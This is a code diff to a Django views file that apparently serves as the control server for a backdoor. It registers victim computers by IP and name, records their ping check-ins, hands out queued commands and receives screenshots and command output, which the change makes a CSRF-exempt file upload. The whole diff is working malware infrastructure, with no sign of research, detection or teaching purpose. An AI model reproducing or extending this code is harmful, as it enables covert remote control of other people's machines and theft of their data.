@@ -1,7 +1,7 @@
 from django.shortcuts import render, redirect
 from django.http import JsonResponse, HttpResponse
 from .models import Output, Computer, Command, Files
-from .forms import CodeForm, ScreenShotForm
+from .forms import CodeForm, ScreenShotForm, OutputForm
 from datetime import timedelta
 from django.utils import timezone
 from django.views.decorators.csrf import csrf_exempt
@@ -59,7 +59,9 @@ def screenshot(request):
     
     return render(request, "backdoor/screenshot.html", {'form':form})
 
-
+def get_id(request, ip, name):
+    computer = Computer.objects.get(ip=ip, name=name)
+    return JsonResponse({'id':computer.id})
 def ping(request, pk):
     computer = Computer.objects.get(id=pk)
     computer.last_online = timezone.now()
@@ -73,13 +75,21 @@ def commands(request, pk):
         commands_dict[i.id] = i.command
     return JsonResponse(commands_dict)
 
-def output(request, pk, command_id, output):
+@csrf_exempt
+def output(request, pk, command_id):
     computer = Computer.objects.get(id=pk)
     command = Command.objects.get(id=command_id)
-    Output.objects.create(target=computer,
-                                   output=output,
-                                   command=command.command,
-                                   time=timezone.now()
-                                    )
-    command.delete()
-    return JsonResponse({})
+    if request.method == 'POST':
+        form = OutputForm(request.POST, request.FILES)
+        if form.is_valid():
+            output = request.FILES['output']
+            Output.objects.create(target=computer,
+                                  output=output,
+                                  command=command.command,
+                                  time=timezone.now())
+            command.delete()
+    else:
+        form = OutputForm()
+    
+    return render(request, "backdoor/output.html", {'form':form})
+
